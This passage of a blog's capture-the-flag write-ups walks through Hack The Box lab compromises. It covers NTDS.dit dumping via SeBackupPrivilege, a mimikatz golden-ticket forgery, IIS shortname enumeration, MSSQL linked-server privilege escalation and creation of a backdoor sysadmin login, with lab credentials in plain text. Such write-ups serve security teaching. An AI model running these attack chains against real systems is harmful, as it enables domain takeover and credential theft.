/v:172.16.249.200 /u:backup-svc /p:'#S3rvice#@cc\nOwned #\rRunning BloodHound might have been a good idea at this point, but everything seemed fairly straightforward, so I opted not to use it. Instead, I focused on the backup-svc user, who had some interesting privileges I could exploit—specifically, the SeBackupPrivilege.\nWith the SeBackupPrivilege, we can create a shadow copy of the OS and access sensitive files like SYSTEM, SECURITY, and NTDS.dit.\nI used the following tool to leverage this privilege: SeBackupPrivilege.\nAfter creating the shadow copy, I mounted it to the G: drive for further exploration.\ndiskshadow.exe set context persistent nowriters add volume C: alias morph3 create expose %morph3% G: To exploit my SeBackupPrivilege, I utilized the DLLs mentioned earlier to enable the privilege.\nImport-Module .\\SeBackupPrivilegeUtils.dll Import-Module .\\SeBackupPrivilegeCmdLets.dll Set-SeBackupPrivilege Copy-FileSeBackupPrivilege \u0026lt;source\u0026gt; \u0026lt;target\u0026gt; To transfer files, I shared 2 directories on both hosts to move back and forth On VDesktop-3 net use R: \\\\172.16.249.200\\C$ /user:backup-svc #S3rvice#@cc On DC net use F: \\\\172.16.249.205\\C$ /user:pmorgan Summer1Summer! I decided to dump the secrets locally on my machine.\npython secretsdump.py -system /root/Desktop/htb/endgame/xen/sixth_flag/SYSTEM -ntds /root/Desktop/htb/endgame/xen/sixth_flag/ntds.dit LOCAL Next we shall get the DC’s ID\n.\\PsGetsid.exe -accepteula \\\\dc.htb.loca We now forge the ticket.\nmimi32.exe kerberos::golden /user:krbtgt /domain:htb.local /krbtgt:3791ca8d70c9e1d2d2c7c5b5c7c253e8 /sid:S-1-5-21-1943675722-3306049422-2153511175 kerberos::ptt ticket.kirbi We can test if it works.\ndir \\\\dc.htb.local\\c$ type \\\\dc.htb.local\\c$\\Users\\Administrator\\Desktop\\flag.txt XEN{[REDACTED]} ","date":"12 October 2024","externalUrl":null,"permalink":"/posts/xen/","section":"Posts","summary":"XEN is an AD lab simulation.","title":"XEN","type":"posts"},{"content":"","date":"7 October 2024","externalUrl":null,"permalink":"/tags/beginner/","section":"Tags","summary":"","title":"Beginner","type":"tags"},{"content":"\rMachine Info #\rProfessional Offensive Operations By eks and mrb3n Professional Offensive Operations is a rising name in the cyber security world. Lately they\u0026rsquo;ve been working into migrating core services and components to a state of the art cluster which offers cutting edge software and hardware. P.O.O. is designed to put your skills in enumeration, lateral movement, and privilege escalation to the test within a small Active Directory environment that is configured with the latest operating systems and technologies. The goal is to compromise the perimeter host, escalate privileges and ultimately compromise the domain while collecting several flags along the way. Entry Point: 10.13.38.11 Aside from the above, we are to get our foothold onto the macine through a n sql server and pivot our way from there to the admin level.\nEnumeration #\rWe shall start first by seeing if our entry point is accessible by pinging it as seen below.\nOur entry point is accessible, we shall then proceed to scan our IP for open ports using nmap.\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O] └─$ nmap -sCV 10.13.38.11 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-07 04:23 EAT Nmap scan report for 10.13.38.11 Host is up (0.30s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: IIS Windows Server | http-methods: |_ Potentially risky methods: TRACE 1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.2056.00; RTM+ | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2024-10-06T09:29:44 |_Not valid after: 2054-10-06T09:29:44 | ms-sql-info: | 10.13.38.11:1433: | Version: | name: Microsoft SQL Server 2017 RTM+ | number: 14.00.2056.00 | Product: Microsoft SQL Server 2017 | Service pack level: RTM | Post-SP patches applied: true |_ TCP port: 1433 |_ssl-date: 2024-10-07T01:24:34+00:00; +3s from scanner time. | ms-sql-ntlm-info: | 10.13.38.11:1433: | Target_Name: POO | NetBIOS_Domain_Name: POO | NetBIOS_Computer_Name: COMPATIBILITY | DNS_Domain_Name: intranet.poo | DNS_Computer_Name: COMPATIBILITY.intranet.poo | DNS_Tree_Name: intranet.poo |_ Product_Version: 10.0.17763 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2s, deviation: 0s, median: 2s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 33.84 seconds As seen above, we have two open ports, 80, 1443. we shall start by seeing what is on port 80\nHTTP Enumeration #\rWe are met with an IIS server page.\nwe shall try to do directory fuzzing to see what directories are available using gobuster. I found some interesting directories, as seen below.\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O] └─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.13.38.11:80 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.13.38.11:80 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 152] [--\u0026gt; http://10.13.38.11:80/images/] /templates (Status: 301) [Size: 155] [--\u0026gt; http://10.13.38.11:80/templates/] /themes (Status: 301) [Size: 152] [--\u0026gt; http://10.13.38.11:80/themes/] /uploads (Status: 301) [Size: 153] [--\u0026gt; http://10.13.38.11:80/uploads/] /Images (Status: 301) [Size: 152] [--\u0026gt; http://10.13.38.11:80/Images/] /admin (Status: 401) [Size: 1293] /plugins (Status: 301) [Size: 153] [--\u0026gt; http://10.13.38.11:80/plugins/] /dev (Status: 301) [Size: 149] [--\u0026gt; http://10.13.38.11:80/dev/] /js (Status: 301) [Size: 148] [--\u0026gt; http://10.13.38.11:80/js/] /Themes (Status: 301) [Size: 152] [--\u0026gt; http://10.13.38.11:80/Themes/] Progress: 1786 / 220561 (0.81%)^C [!] Keyboard interrupt detected, terminating. Progress: 1801 / 220561 (0.82%) =============================================================== Finished =============================================================== there is an admin and uploads page, lets try to visit it to see what we can find.\nWe are required to log in but we do not have a clue of any user, however, after trying to log in with the user admin and password as admin, still nothing. Therefore we shall continue with enumeration with a big wordlist to see if we can find anything that is of interest to us, this time I used the wordlist raft-large-words-lowercase.txtI found an interesting directory.\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O] └─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -u http://10.13.38.11:80 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.13.38.11:80 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 152] [--\u0026gt; http://10.13.38.11:80/images/] /templates (Status: 301) [Size: 155] [--\u0026gt; http://10.13.38.11:80/templates/] /admin (Status: 401) [Size: 1293] /plugins (Status: 301) [Size: 153] [--\u0026gt; http://10.13.38.11:80/plugins/] /js (Status: 301) [Size: 148] [--\u0026gt; http://10.13.38.11:80/js/] /themes (Status: 301) [Size: 152] [--\u0026gt; http://10.13.38.11:80/themes/] /uploads (Status: 301) [Size: 153] [--\u0026gt; http://10.13.38.11:80/uploads/] /dev (Status: 301) [Size: 149] [--\u0026gt; http://10.13.38.11:80/dev/] /. (Status: 200) [Size: 703] /widgets (Status: 301) [Size: 153] [--\u0026gt; http://10.13.38.11:80/widgets/] /meta-inf (Status: 301) [Size: 154] [--\u0026gt; http://10.13.38.11:80/meta-inf/] /.ds_store (Status: 200) [Size: 10244] Progress: 9547 / 107983 (8.84%)^C [!] Keyboard interrupt detected, terminating. Progress: 9557 / 107983 (8.85%) =============================================================== Finished =============================================================== .ds_store\n.DS_Store Enumeration #\r.DS_Store files are actually created by MacOS when it visits a directory. They store attributes of the folder and the files within it. Likely here the site was developed on a Mac and then deployed to this Windows server. The structure of the .ds_store file is proprietary, but it has been reversed (see this post for an excellent deep dive).\nI first found the Python-dsstore tool to parse .DS_Store files, then later learned of DS_Walk, which uses dsstore.py to recursively walk a webserver. I will clone the repo and parse it the webserver\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O/.ds_store/DS_Walk] └─$ python3 ds_walk.py -u http://10.13.38.11 [!] .ds_store file is present on the webserver. [+] Enumerating directories based on .ds_server file: ---------------------------- [!] http://10.13.38.11/admin [!] http://10.13.38.11/dev [!] http://10.13.38.11/iisstart.htm [!] http://10.13.38.11/Images [!] http://10.13.38.11/JS [!] http://10.13.38.11/META-INF [!] http://10.13.38.11/New folder [!] http://10.13.38.11/New folder (2) [!] http://10.13.38.11/Plugins [!] http://10.13.38.11/Templates [!] http://10.13.38.11/Themes [!] http://10.13.38.11/Uploads [!] http://10.13.38.11/web.config [!] http://10.13.38.11/Widgets ---------------------------- [!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1 [!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc ---------------------------- [!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/core [!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db [!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/include [!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/src ---------------------------- [!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/core [!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db [!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/include [!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/src ---------------------------- [!] http://10.13.38.11/Images/buttons [!] http://10.13.38.11/Images/icons [!] http://10.13.38.11/Images/iisstart.png ---------------------------- [!] http://10.13.38.11/JS/custom ---------------------------- [!] http://10.13.38.11/Themes/default ---------------------------- [!] http://10.13.38.11/Widgets/CalendarEvents [!] http://10.13.38.11/Widgets/Framework [!] http://10.13.38.11/Widgets/Menu [!] http://10.13.38.11/Widgets/Notifications ---------------------------- [!] http://10.13.38.11/Widgets/Framework/Layouts ---------------------------- [!] http://10.13.38.11/Widgets/Framework/Layouts/custom [!] http://10.13.38.11/Widgets/Framework/Layouts/default ---------------------------- [*] Finished traversing. No remaining .ds_store files present. [*] Cleaning up .ds_store files saved to disk This gives a pretty clear picture of the directories on the server. One thing that jumped out is the two directories in /dev, both of which look like md5hashes. Some quick guessing shows that they are actually md5 hashes of the two creators, md5(mrb3n) = 304c0c90fbc6520610abbf378e2339d1 and md5(eks) = dca66d38fd916317687e1390a420c3fc.\nIIS Shortnames #\rA key technique here is to exploit Windows\u0026rsquo; short file names, known as the 8.3 naming convention, which restricts each file name to eight characters followed by a dot and a three-character extension. There was an intriguing paper that explored how earlier versions of IIS and .NET handle these 8.3 file names. The method involves examining how the server deals with 8.3 names that include wildcards, which it appears to process when the tilde (~) symbol is present in the file path.\nDifferent servers may require different HTTP request methods to detect this behavior. On this particular server, the issue doesn’t appear with a GET request, but is exposed using an OPTIONS request. For instance, using gobuster, I found that there is a folder called templates in the root directory. When I send an OPTIONS request to http://10.13.38/11/t*~1*/.aspx, the server responds with a 404 error. However, when I send a request to http://10.13.38/11/c*~1*/.aspx, it responds with a 200 status code.\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O] └─$ curl -s -I -X OPTIONS \u0026#39;http://10.13.38.11/c*~1*/.aspx\u0026#39; HTTP/1.1 200 OK Allow: OPTIONS, TRACE, GET, HEAD, POST Server: Microsoft-IIS/10.0 Public: OPTIONS, TRACE, GET, HEAD, POST Date: Mon, 07 Oct 2024 02:11:52 GMT Content-Length: 0 ┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O] └─$ curl -s -I -X OPTIONS \u0026#39;http://10.13.38.11/t*~1*/.aspx\u0026#39; HTTP/1.1 404 Not Found Content-Type: text/html Server: Microsoft-IIS/10.0 Date: Mon, 07 Oct 2024 02:12:10 GMT Content-Length: 1245 I tried each character and got the next character to be s, as seen below.\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O] └─$ curl -s -I -X OPTIONS \u0026#39;http://10.13.38.11/ta*~1*/.aspx\u0026#39; HTTP/1.1 200 OK Allow: OPTIONS, TRACE, GET, HEAD, POST Server: Microsoft-IIS/10.0 Public: OPTIONS, TRACE, GET, HEAD, POST Date: Mon, 07 Oct 2024 02:14:08 GMT Content-Length: 0 ┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O] └─$ curl -s -I -X OPTIONS \u0026#39;http://10.13.38.11/tem*~1*/.aspx\u0026#39; HTTP/1.1 404 Not Found Content-Type: text/html Server: Microsoft-IIS/10.0 Date: Mon, 07 Oct 2024 02:14:15 GMT Content-Length: 1245 However, this does not work for all directories / files. It does not find /admin,likely due to permissions. I found a couple of tools to do the brute force. This tool is the one associated with the research paper above, but it’s in Java, so I kept looking and found this Python scanner. When running it on the root directory, it found some of the stuff in it:\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner] └─$ python3 iis_shortname_scan.py http://10.13.38.11/ Server is vulnerable, please wait, scanning... [+] /d~1.* [scan in progress] [+] /n~1.* [scan in progress] [+] /t~1.* [scan in progress] [+] /w~1.* [scan in progress] [+] /ds~1.* [scan in progress] [+] /ne~1.* [scan in progress] [+] /te~1.* [scan in progress] [+] /tr~1.* [scan in progress] [+] /we~1.* [scan in progress] [+] /ds_~1.* [scan in progress] [+] /new~1.* [scan in progress] [+] /tem~1.* [scan in progress] [+] /tra~1.* [scan in progress] [+] /web~1.* [scan in progress] [+] /ds_s~1.* [scan in progress] [+] /newf~1.* [scan in progress] [+] /temp~1.* [scan in progress] [+] /tras~1.* [scan in progress] [+] /ds_st~1.* [scan in progress] [+] /newfo~1.* [scan in progress] [+] /templ~1.* [scan in progress] [+] /trash~1.* [scan in progress] [+] /ds_sto~1.* [scan in progress] [+] /newfol~1.* [scan in progress] [+] /templa~1.* [scan in progress] [+] /trashe~1.* [scan in progress] [+] /ds_sto~1 [scan in progress] [+] Directory /ds_sto~1 [Done] [+] /newfol~1 [scan in progress] [+] Directory /newfol~1 [Done] [+] /templa~1 [scan in progress] [+] Directory /templa~1 [Done] [+] /trashe~1 [scan in progress] [+] Directory /trashe~1 [Done] ---------------------------------------------------------------- Dir: /ds_sto~1 Dir: /newfol~1 Dir: /templa~1 Dir: /trashe~1 ---------------------------------------------------------------- 4 Directories, 0 Files found in total Note that * is a wildcard, matches any character zero or more times. I\u0026rsquo;m unsure why the script omits the dot before .DS_Store. It classifies it as a directory because, in the 8.3 naming scheme, files without an extension are interpreted as directories.\nWhat\u0026rsquo;s more intriguing is the behavior when I run the script against the /dev directories. At the root, it only detects .DS_Store and the two hash directories that I already know exist. Inside each of the hash directories, it only identifies .DS_Store. Interestingly, it shows that the src, include, and core directories are not vulnerable, but the db directory displays what seems to be the same file in both instances:\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner] └─$ python3 iis_shortname_scan.py http://10.13.38.11/dev/ Server is vulnerable, please wait, scanning... [+] /dev/d~1.* [scan in progress] [+] /dev/3~1.* [scan in progress] [+] /dev/ds~1.* [scan in progress] [+] /dev/dc~1.* [scan in progress] [+] /dev/30~1.* [scan in progress] [+] /dev/ds_~1.* [scan in progress] [+] /dev/dca~1.* [scan in progress] [+] /dev/304~1.* [scan in progress] [+] /dev/ds_s~1.* [scan in progress] [+] /dev/dca6~1.* [scan in progress] [+] /dev/304c~1.* [scan in progress] [+] /dev/ds_st~1.* [scan in progress] [+] /dev/dca66~1.* [scan in progress] [+] /dev/304c0~1.* [scan in progress] [+] /dev/ds_sto~1.* [scan in progress] [+] /dev/dca66d~1.* [scan in progress] [+] /dev/304c0c~1.* [scan in progress] [+] /dev/ds_sto~1 [scan in progress] [+] Directory /dev/ds_sto~1 [Done] [+] /dev/dca66d~1 [scan in progress] [+] Directory /dev/dca66d~1 [Done] [+] /dev/304c0c~1 [scan in progress] [+] Directory /dev/304c0c~1 [Done] ---------------------------------------------------------------- Dir: /dev/ds_sto~1 Dir: /dev/dca66d~1 Dir: /dev/304c0c~1 ---------------------------------------------------------------- 3 Directories, 0 Files found in total Note that * is a wildcard, matches any character zero or more times. ┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner] └─$ python3 iis_shortname_scan.py http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db Server is vulnerable, please wait, scanning... [+] /dev/dca66d38fd916317687e1390a420c3fc/db/p~1.* [scan in progress] [+] /dev/dca66d38fd916317687e1390a420c3fc/db/po~1.* [scan in progress] [+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo~1.* [scan in progress] [+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_~1.* [scan in progress] [+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_c~1.* [scan in progress] [+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.* [scan in progress] [+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.t* [scan in progress] [+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.tx* [scan in progress] [+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt* [scan in progress] [+] File /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt* [Done] ---------------------------------------------------------------- File: /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt* ---------------------------------------------------------------- 0 Directories, 1 Files found in total Note that * is a wildcard, matches any character zero or more times. ┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner] └─$ python3 iis_shortname_scan.py http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db Server is vulnerable, please wait, scanning... [+] /dev/304c0c90fbc6520610abbf378e2339d1/db/p~1.* [scan in progress] [+] /dev/304c0c90fbc6520610abbf378e2339d1/db/po~1.* [scan in progress] [+] /dev/304c0c90fbc6520610abbf378e2339d1/db/poo~1.* [scan in progress] [+] /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_~1.* [scan in progress] [+] /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_c~1.* [scan in progress] [+] /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.* [scan in progress] [+] /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.t* [scan in progress] [+] /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.tx* [scan in progress] [+] /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.txt* [scan in progress] [+] File /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.txt* [Done] ---------------------------------------------------------------- File: /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.txt* ---------------------------------------------------------------- 0 Directories, 1 Files found in total Note that * is a wildcard, matches any character zero or more times. File fuzzing #\rI’m aware of a .txt file in /dev/304c0c90fbc6520610abbf378e2339d1/db/ that begins with poo_co. At this point, I can use wfuzz to try and discover the rest of the filename. To narrow down the search, I’ll extract words starting with \u0026lsquo;co\u0026rsquo; from raft-large-words-lowercase.txt, which generates a relatively compact wordlist to work with:\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner] └─$ grep \u0026#34;^co\u0026#34; /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt \u0026gt; co_fuzzing.txt ┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner] └─$ wc -l co_fuzzing.txt 2351 co_fuzzing.txt lets try and fuzz now.\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner] └─$ wfuzz -c -w co_fuzzing.txt -u http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_FUZZ.txt --hc 404 ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_FUZZ.txt Total requests: 2351 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000097: 200 6 L 7 W 142 Ch \u0026#34;connection\u0026#34; Total time: 87.84663 Processed Requests: 2351 Filtered Requests: 2350 Requests/sec.: 26.76255 Retrieving this file (from either dev directory) reveals connection details for MSSQL and the first flag, Recon:\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner] └─$ curl -s http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_connection.txt SERVER=10.13.38.11 USERID=external_user DBNAME=POO_PUBLIC USERPWD=#p00Public3xt3rnalUs3r# Flag : [REDACTED] Huh?! #\rMSSQL Enumeration. #\rUsing creds from the previous step, I can now connect to the MSSQL instance on TCP 1433\n┌──(root㉿v1c70r)-[/home/…/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner] └─# python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py external_user:#p00Public3xt3rnalUs3r#@10.13.38.11 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(COMPATIBILITY\\POO_PUBLIC): Line 1: Changed database context to \u0026#39;master\u0026#39;. [*] INFO(COMPATIBILITY\\POO_PUBLIC): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (140 88) [!] Press help for extra shell commands SQL (external_user external_user@master)\u0026gt; I can perform basic server enumeration to gather information such as the MSSQL version, user accounts, and admin users:\nSQL (external_user external_user@master)\u0026gt; select @@version; ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- Microsoft SQL Server 2017 (RTM-GDR) (KB5040942) - 14.0.2056.2 (X64) Jun 20 2024 11:02:32 Copyright (C) 2017 Microsoft Corporation Standard Edition (64-bit) on Windows Server 2019 Standard 10.0 \u0026lt;X64\u0026gt; (Build 17763: ) (Hypervisor) SQL (external_user external_user@master)\u0026gt; select name FROM master..syslogins name ------------- sa external_user SQL (external_user external_user@master)\u0026gt; select name FROM master..syslogins WHERE sysadmin = \u0026#39;1\u0026#39;; name ---- sa Although we have found two users, there is one other user, the admin . I can enumerate my privileges to see what activities I can do on the server.\nSQL (external_user external_user@master)\u0026gt; SELECT entity_name, permission_name FROM fn_my_permissions(NULL, \u0026#39;SERVER\u0026#39;); entity_name permission_name ----------- --------------- server CONNECT SQL I can list the databases and find the current one.\nSQL (external_user external_user@master)\u0026gt; SELECT name FROM master..sysdatabases; name ---------- master tempdb POO_PUBLIC SQL\u0026gt; SELECT DB_NAME(); ------------------------------ master I explored the different tables and their columns, but didn’t come across anything significant worth sharing.\nLinked Servers #\rEnumeration #\rThis article provides a useful guide on how to exploit SQL Server links. An SQL Server link allows an MSSQL server to connect to external data sources, including other MSSQL servers, Oracle databases, Excel workbooks, and more. The link specifies which resources are accessed and under which user account. If not properly configured, this can be exploited.\nSQL (external_user external_user@master)\u0026gt; select @@servername ------------------------ COMPATIBILITY\\POO_PUBLIC To check for linked servers, I’ll query the sysservers table (the article recommends *, but I’ll just show the name for readability):\nSQL (external_user external_user@master)\u0026gt; select srvname from sysservers; srvname ------------------------ COMPATIBILITY\\POO_CONFIG COMPATIBILITY\\POO_PUBLIC There is another linked remote server, POO_CONFIG.\nPOO_CONFIG\nI found EXECUTE, to be much more successful, however, from the article openquery is used to run queries on other servers.\nSQL (external_user external_user@master)\u0026gt; EXECUTE (\u0026#39;select @@servername;\u0026#39;) at [COMPATIBILITY\\POO_CONFIG]; ------------------------ COMPATIBILITY\\POO_CONFIG The link is set up to execute commands as the internal_user:\nSQL (external_user external_user@master)\u0026gt; EXECUTE (\u0026#39;select suser_name();\u0026#39;) at [COMPATIBILITY\\POO_CONFIG]; ------------- internal_user The user we found is not an admin.\nSQL (external_user external_user@master)\u0026gt; EXECUTE (\u0026#39;select name FROM master..syslogins WHERE sysadmin = \u0026#39;\u0026#39;1\u0026#39;\u0026#39;;\u0026#39;) at [COMPATIBILITY\\POO_CONFIG]; name ---- sa SQL (external_user external_user@master)\u0026gt; EXECUTE (\u0026#39;SELECT entity_name, permission_name FROM fn_my_permissions(NULL, \u0026#39;\u0026#39;SERVER\u0026#39;\u0026#39;);\u0026#39;) at [COMPATIBILITY\\POO_CONFIG]; entity_name permission_name ----------- --------------- server CONNECT SQL looking at the data in the tables, I found nothing of interest.\nI tried to have POO_CONFIG run a command on POO_PUBLIC and it works as seen below.\nSQL (external_user external_user@master)\u0026gt; EXEC (\u0026#39;EXEC (\u0026#39;\u0026#39;select suser_name();\u0026#39;\u0026#39;) at [COMPATIBILITY\\POO_PUBLIC]\u0026#39;) at [COMPATIBILITY\\POO_CONFIG]; -- sa Not only did it succeed, but that command is now being executed as the sa user! This misconfiguration occurs because when the two links between the databases were established, the first link allows any user on POO_PUBLIC to run queries (i.e., commands) on POO_CONFIG as internal_user. The second link must have been configured so that any user on POO_CONFIG can run queries on POO_PUBLIC as sa. This second link may have seemed reasonable to an administrator at the time, as only trusted individuals would have access to the internal POO_PUBLIC. It\u0026rsquo;s easy to overlook the other link.\nNow, when I check my permissions locally on POO_CONFIG with the current user, I find that I have almost no privileges:\nSQL (external_user external_user@master)\u0026gt; EXECUTE (\u0026#39;SELECT entity_name, permission_name FROM fn_my_permissions(NULL, \u0026#39;\u0026#39;SERVER\u0026#39;\u0026#39;);\u0026#39;) at [COMPATIBILITY\\POO_CONFIG] entity_name permission_name ----------- --------------- server CONNECT SQL However, when I ask POO_CONFIG to POO_PUBLIC, I’ve got all the permissions:\nSQL (external_user external_user@master)\u0026gt; EXECUTE (\u0026#39;EXECUTE (\u0026#39;\u0026#39;SELECT entity_name, permission_name FROM fn_my_permissions(NULL, \u0026#39;\u0026#39;\u0026#39;\u0026#39;SERVER\u0026#39;\u0026#39;\u0026#39;\u0026#39;);\u0026#39;\u0026#39;) at [COMPATIBILITY\\POO_PUBLIC]\u0026#39;) at [COMPATIBILITY\\POO_CONFIG]; entity_name permission_name ----------- ------------------------------- server CONNECT SQL server SHUTDOWN server CREATE ENDPOINT server CREATE ANY DATABASE server CREATE AVAILABILITY GROUP server ALTER ANY LOGIN server ALTER ANY CREDENTIAL server ALTER ANY ENDPOINT server ALTER ANY LINKED SERVER server ALTER ANY CONNECTION server ALTER ANY DATABASE server ALTER RESOURCES server ALTER SETTINGS server ALTER TRACE server ALTER ANY AVAILABILITY GROUP server ADMINISTER BULK OPERATIONS server AUTHENTICATE SERVER server EXTERNAL ACCESS ASSEMBLY server VIEW ANY DATABASE server VIEW ANY DEFINITION server VIEW SERVER STATE server CREATE DDL EVENT NOTIFICATION server CREATE TRACE EVENT NOTIFICATION server ALTER ANY EVENT NOTIFICATION server ALTER SERVER STATE server UNSAFE ASSEMBLY server ALTER ANY SERVER AUDIT server CREATE SERVER ROLE server ALTER ANY SERVER ROLE server ALTER ANY EVENT SESSION server CONNECT ANY DATABASE server IMPERSONATE ANY LOGIN server SELECT ALL USER SECURABLES server CONTROL SERVER To make our work easier, I shall add another sa user to make our work easier rather than keep on bouncing everything every time.\nSQL (external_user external_user@master)\u0026gt; EXECUTE(\u0026#39;EXECUTE(\u0026#39;\u0026#39;CREATE LOGIN df WITH PASSWORD = \u0026#39;\u0026#39;\u0026#39;\u0026#39;victor_n00b\u0026#39;\u0026#39;\u0026#39;\u0026#39;;\u0026#39;\u0026#39;) AT [COMPATIBILITY\\POO_PUBLIC]\u0026#39;) AT [COMPATIBILITY\\POO_CONFIG] SQL (external_user external_user@master)\u0026gt; EXECUTE(\u0026#39;EXECUTE(\u0026#39;\u0026#39;EXEC sp_addsrvrolemember \u0026#39;\u0026#39;\u0026#39;\u0026#39;df\u0026#39;\u0026#39;\u0026#39;\u0026#39;, \u0026#39;\u0026#39;\u0026#39;\u0026#39;sysadmin\u0026#39;\u0026#39;\u0026#39;\u0026#39;\u0026#39;\u0026#39;) AT [COMPATIBILITY\\POO_PUBLIC]\u0026#39;) AT [COMPATIBILITY\\POO_CONFIG] SQL (external_user Lets try to connect to the server with our new admin account.\n┌──(root㉿v1c70r)-[/home/…/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner] └─# python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py df:victor_n00b@10.13.38.11 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(COMPATIBILITY\\POO_PUBLIC): Line 1: Changed database context to \u0026#39;master\u0026#39;. [*] INFO(COMPATIBILITY\\POO_PUBLIC): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (140 88) [!] Press help for extra shell commands SQL (df dbo@master)\u0026gt; we are in, lets get our DB flag now. As the new sa user, I can now access another database flag and to query a I can now access another database in MSSQL, the syntax is [server].[db].[schema].[table]. Therefore, I can retrieve the flag using the following command as shown below.\nSQL (df dbo@master)\u0026gt; SELECT name FROM master..sysdatabases; name ---------- master tempdb model msdb POO_PUBLIC flag SQL (df dbo@master)\u0026gt; select table_schema from 